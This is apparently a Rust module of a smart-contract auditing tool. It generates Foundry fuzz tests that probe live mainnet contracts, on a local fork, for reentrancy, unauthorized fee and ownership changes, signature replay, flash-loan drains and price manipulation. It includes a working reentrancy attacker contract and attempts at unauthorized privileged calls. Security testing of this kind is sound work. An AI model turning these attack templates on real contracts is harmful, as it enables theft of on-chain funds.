//! Specialized Fuzz Tests — اختبارات متخصصة لكل نوع ثغرة
use anyhow::Result;
use std::fs;
use std::process::Command;
use colored::*;
use tracing::{info, warn};

use crate::reporter::{Finding, Severity};
use crate::scanner::ContractInfo;
use crate::fuzzer::FuzzResult;

pub struct SpecializedFuzzer {
    pub rpc_url: String,
    pub fuzz_runs: u32,
    pub foundry_dir: String,
    pub forge_std_path: String,
}

impl SpecializedFuzzer {
    pub fn new(rpc_url: String, fuzz_runs: u32) -> Self {
        let foundry_dir = format!("/tmp/evm-spec-fuzz-{}", std::process::id());
        Self {
            rpc_url,
            fuzz_runs,
            foundry_dir,
            forge_std_path: "/root/foundry-std/lib/forge-std".to_string(),
        }
    }

    pub async fn run_all(
        &self,
        contract: &ContractInfo,
        findings: &[Finding],
    ) -> Result<Vec<FuzzResult>> {
        let mut results = Vec::new();
        self.setup_project()?;

        // اختر الاختبارات المناسبة حسب الثغرات
        let tests = self.select_tests(contract, findings);

        for (test_name, test_code) in &tests {
            info!("🧪 Running specialized test: {}", test_name);

            let test_path = format!("{}/test/{}.t.sol", self.foundry_dir, test_name);
            fs::write(&test_path, test_code)?;

            match self.run_forge(&contract.address) {
                Ok(output) => {
                    let result = self.analyze_output(&contract.address, test_name, &output);
                    if result.exploitable {
                        println!("   {} {} — {} CONFIRMED!",
                            "🔴 EXPLOIT".red().bold(),
                            &contract.address[..10],
                            test_name
                        );
                        if let Some(ref ce) = result.counterexample {
                            println!("   └─ {}", ce.yellow());
                        }
                    }
                    results.push(result);
                    if results.last().map(|r: &FuzzResult| r.exploitable).unwrap_or(false) {
                        break; // وقف بعد أول exploit
                    }
                }
                Err(e) => warn!("Specialized test {} failed: {}", test_name, e),
            }
        }

        let _ = fs::remove_dir_all(&self.foundry_dir);
        Ok(results)
    }

    fn select_tests(&self, contract: &ContractInfo, findings: &[Finding]) -> Vec<(String, String)> {
        let mut tests = Vec::new();
        let addr = checksum_addr_spec(&contract.address);
        let source = contract.sources.first().map(|s| s.content.as_str()).unwrap_or("");
        let lower = source.to_lowercase();

        // Reentrancy Test
        if findings.iter().any(|f| f.id.contains("REENTRANCY") || f.id.contains("EXTERNAL_CALL")) {
            tests.push(("ReentrancyTest".to_string(), self.gen_reentrancy_test(&addr)));
        }

        // Fee Drain Test
        if findings.iter().any(|f| f.id.contains("UNCAPPED_FEE") || f.id.contains("FEE")) {
            tests.push(("FeeDrainTest".to_string(), self.gen_fee_drain_test(&addr)));
        }

        // Ownership Takeover Test
        if findings.iter().any(|f| f.id.contains("PERMISSION") || f.id.contains("PROXY")) {
            tests.push(("OwnershipTest".to_string(), self.gen_ownership_test(&addr)));
        }

        // Signature Replay Test
        if findings.iter().any(|f| f.id.contains("SIGNATURE") || f.id.contains("ECRECOVER")) {
            tests.push(("SignatureReplayTest".to_string(), self.gen_signature_replay_test(&addr)));
        }

        // Flash Loan Test
        if lower.contains("swap") || lower.contains("pool") || lower.contains("liquidity") {
            tests.push(("FlashLoanTest".to_string(), self.gen_flash_loan_test(&addr)));
        }

        // Price Manipulation Test
        if lower.contains("oracle") || lower.contains("getprice") || lower.contains("getreserves") {
            tests.push(("PriceManipTest".to_string(), self.gen_price_manip_test(&addr)));
        }

        tests
    }

    fn gen_reentrancy_test(&self, address: &str) -> String {
        format!(r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {{
    function deposit() external payable;
    function withdraw() external;
    function withdraw(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}}

contract ReentrancyAttacker {{
    ITarget target;
    uint256 public attackCount;
    uint256 public stolenAmount;
    uint256 depositAmount;

    constructor(address _target) {{ target = ITarget(_target); }}

    function attack() external payable {{
        depositAmount = msg.value;
        target.deposit{{value: msg.value}}();
        target.withdraw();
    }}

    receive() external payable {{
        stolenAmount += msg.value;
        if (attackCount < 3 && address(target).balance >= depositAmount) {{
            attackCount++;
            try target.withdraw() {{}} catch {{}}
        }}
    }}
}}

contract ReentrancyTest is Test {{
    ITarget target = ITarget({});

    function setUp() public {{ vm.createSelectFork("mainnet"); }}

    function testFuzz_Reentrancy(uint96 amount) public {{
        vm.assume(amount >= 0.001 ether && amount <= 0.1 ether);
        uint256 contractBal = address(target).balance;
        if (contractBal < uint256(amount)) return;

        ReentrancyAttacker attacker = new ReentrancyAttacker(address(target));
        vm.deal(address(attacker), uint256(amount));

        try attacker.attack{{value: uint256(amount)}}() {{
            assertLe(
                attacker.stolenAmount(),
                uint256(amount),
                "EXPLOIT: Reentrancy - drained more than deposited!"
            );
        }} catch {{}}
    }}
}}"#, address)
    }

    fn gen_fee_drain_test(&self, address: &str) -> String {
        format!(r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {{
    function setTax(uint256 buy, uint256 sell) external;
    function setBuyFee(uint256 fee) external;
    function setSellFee(uint256 fee) external;
    function setFee(uint256 fee) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function owner() external view returns (address);
}}

contract FeeDrainTest is Test {{
    ITarget target = ITarget({});

    function setUp() public {{ vm.createSelectFork("mainnet"); }}

    function testFuzz_FeeDrain(address attacker, uint256 feeAmount) public {{
        vm.assume(attacker != address(0));
        vm.assume(feeAmount > 50); // أكثر من 50% خطير

        address owner = address(0);
        try target.owner() returns (address o) {{ owner = o; }} catch {{}}
        if (owner == address(0)) return;

        // حاول تضبط الـ fee من غير ما تكون owner
        vm.prank(attacker);
        bool succeeded = false;

        try target.setTax(feeAmount, feeAmount) {{ succeeded = true; }} catch {{}}
        try target.setFee(feeAmount) {{ succeeded = true; }} catch {{}}

        assertFalse(succeeded, "EXPLOIT: Fee manipulation without owner access!");
    }}
}}"#, address)
    }

    fn gen_ownership_test(&self, address: &str) -> String {
        format!(r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {{
    function initialize(address owner) external;
    function initialize() external;
    function transferOwnership(address newOwner) external;
    function owner() external view returns (address);
    function renounceOwnership() external;
}}

contract OwnershipTest is Test {{
    ITarget target = ITarget({});

    function setUp() public {{ vm.createSelectFork("mainnet"); }}

    function testFuzz_OwnershipTakeover(address attacker) public {{
        vm.assume(attacker != address(0));
        vm.assume(attacker.code.length == 0);

        address ownerBefore = address(0);
        try target.owner() returns (address o) {{ ownerBefore = o; }} catch {{ return; }}

        vm.startPrank(attacker);

        try target.initialize(attacker) {{
            address ownerAfter = address(0);
            try target.owner() returns (address o) {{ ownerAfter = o; }} catch {{}}
            assertNotEq(ownerAfter, attacker, "EXPLOIT: Ownership hijacked via initialize()!");
        }} catch {{}}

        try target.transferOwnership(attacker) {{
            address ownerAfter = address(0);
            try target.owner() returns (address o) {{ ownerAfter = o; }} catch {{}}
            assertNotEq(ownerAfter, attacker, "EXPLOIT: Ownership transferred without authorization!");
        }} catch {{}}

        vm.stopPrank();
    }}
}}"#, address)
    }

    fn gen_signature_replay_test(&self, address: &str) -> String {
        format!(r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {{
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    function nonces(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}}

contract SignatureReplayTest is Test {{
    ITarget target = ITarget({});

    function setUp() public {{ vm.createSelectFork("mainnet"); }}

    function testFuzz_SignatureReplay(address victim, address attacker, uint256 amount) public {{
        vm.assume(victim != address(0) && attacker != address(0));
        vm.assume(victim != attacker);
        vm.assume(amount > 0 && amount < 1000000 ether);

        // محاولة إعادة استخدام توقيع منتهي
        uint8 v = 27;
        bytes32 r = bytes32(uint256(1));
        bytes32 s = bytes32(uint256(2));

        uint256 allowanceBefore = 0;
        try target.allowance(victim, attacker) returns (uint256 a) {{ allowanceBefore = a; }} catch {{ return; }}

        try target.permit(victim, attacker, amount, 0, v, r, s) {{
            uint256 allowanceAfter = 0;
            try target.allowance(victim, attacker) returns (uint256 a) {{ allowanceAfter = a; }} catch {{}}
            assertEq(allowanceAfter, allowanceBefore, "EXPLOIT: Signature replay succeeded!");
        }} catch {{}}
    }}
}}"#, address)
    }

    fn gen_flash_loan_test(&self, address: &str) -> String {
        format!(r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {{
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function balanceOf(address) external view returns (uint256);
}}

interface IERC20 {{
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}}

contract FlashLoanTest is Test {{
    ITarget target = ITarget({});

    function setUp() public {{ vm.createSelectFork("mainnet"); }}

    function test_FlashLoanManipulation() public {{
        (uint112 r0, uint112 r1,) = (0, 0, 0);
        try target.getReserves() returns (uint112 a, uint112 b, uint32) {{
            r0 = a; r1 = b;
        }} catch {{ return; }}

        if (r0 == 0 || r1 == 0) return;

        // نبدأ بـ 0 tokens ونحاول نحصل على أكثر
        address t0 = address(0);
        try target.token0() returns (address a) {{ t0 = a; }} catch {{ return; }}

        uint256 balBefore = 0;
        try IERC20(t0).balanceOf(address(this)) returns (uint256 b) {{ balBefore = b; }} catch {{ return; }}

        // حاول swap بدون دفع
        try target.swap(uint256(r0) / 10, 0, address(this), abi.encode("flash")) {{
            uint256 balAfter = 0;
            try IERC20(t0).balanceOf(address(this)) returns (uint256 b) {{ balAfter = b; }} catch {{}}
            assertLe(balAfter, balBefore, "EXPLOIT: Flash loan drain succeeded!");
        }} catch {{}}
    }}
}}"#, address)
    }

    fn gen_price_manip_test(&self, address: &str) -> String {
        format!(r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {{
    function getPrice() external view returns (uint256);
    function getPricePerToken() external view returns (uint256);
    function borrow(uint256 amount) external;
    function deposit(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}}

contract PriceManipTest is Test {{
    ITarget target = ITarget({});

    function setUp() public {{ vm.createSelectFork("mainnet"); }}

    function testFuzz_PriceManipulation(uint256 manipAmount) public {{
        vm.assume(manipAmount > 1000 && manipAmount < 1000000 ether);

        uint256 priceBefore = 0;
        try target.getPrice() returns (uint256 p) {{ priceBefore = p; }} catch {{
            try target.getPricePerToken() returns (uint256 p) {{ priceBefore = p; }} catch {{ return; }}
        }}

        if (priceBefore == 0) return;

        // حاول تغير السعر بدون authorization
        vm.prank(address(uint160(uint256(keccak256("manipulator")))));
        try target.deposit(manipAmount) {{
            uint256 priceAfter = 0;
            try target.getPrice() returns (uint256 p) {{ priceAfter = p; }} catch {{}}

            // إذا تغير السعر بشكل كبير = قابل للتلاعب
            if (priceAfter > 0 && priceBefore > 0) {{
                uint256 change = priceAfter > priceBefore ?
                    (priceAfter - priceBefore) * 100 / priceBefore :
                    (priceBefore - priceAfter) * 100 / priceBefore;
                assertLt(change, 10, "EXPLOIT: Price manipulation > 10% possible!");
            }}
        }} catch {{}}
    }}
}}"#, address)
    }

    fn setup_project(&self) -> Result<()> {
        fs::create_dir_all(format!("{}/test", self.foundry_dir))?;
        fs::create_dir_all(format!("{}/src", self.foundry_dir))?;
        fs::create_dir_all(format!("{}/lib", self.foundry_dir))?;

        let _ = Command::new("ln")
            .args(["-sf", &self.forge_std_path,
                  &format!("{}/lib/forge-std", self.foundry_dir)])
            .output();

        let toml = format!(r#"[profile.default]
src = "src"
out = "out"
libs = ["lib"]
remappings = ["forge-std/={}/src/"]
fuzz = {{ runs = {}, max_test_rejects = 65536 }}
eth_rpc_url = "{}"

[rpc_endpoints]
mainnet = "{}"
"#, self.forge_std_path, self.fuzz_runs, self.rpc_url, self.rpc_url);

        fs::write(format!("{}/foundry.toml", self.foundry_dir), toml)?;
        Ok(())
    }

    fn run_forge(&self, _address: &str) -> Result<String> {
        let output = Command::new("/root/.foundry/bin/forge")
            .args(["test", "-vv"])
            .env("FOUNDRY_FUZZ_RUNS", self.fuzz_runs.to_string())
            .current_dir(&self.foundry_dir)
            .output()
            .map_err(|e| anyhow::anyhow!("forge failed: {}", e))?;

        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        Ok(format!("{}\n{}", stdout, stderr))
    }

    fn analyze_output(&self, address: &str, test_name: &str, output: &str) -> FuzzResult {
        let exploitable = output.contains("FAIL") && output.contains("EXPLOIT:");
        let counterexample = output.lines()
            .find(|l| l.contains("counterexample") || l.contains("args="))
            .map(|l| l.trim().to_string());

        let details = if exploitable {
            output.lines()
                .find(|l| l.contains("EXPLOIT:"))
                .unwrap_or("Exploit confirmed")
                .trim()
                .to_string()
        } else {
            format!("Passed {} specialized fuzz runs", self.fuzz_runs)
        };

        FuzzResult {
            address: address.to_string(),
            exploitable,
            vulnerability: test_name.to_string(),
            details,
            counterexample,
        }
    }
}

fn checksum_addr_spec(addr: &str) -> String {
    let output = std::process::Command::new("/root/.foundry/bin/cast")
        .args(["--to-checksum-address", addr])
        .output();
    match output {
        Ok(out) if out.status.success() => {
            String::from_utf8_lossy(&out.stdout).trim().to_string()
        }
        _ => format!("0x{}", addr.trim_start_matches("0x").to_lowercase())
    }
}
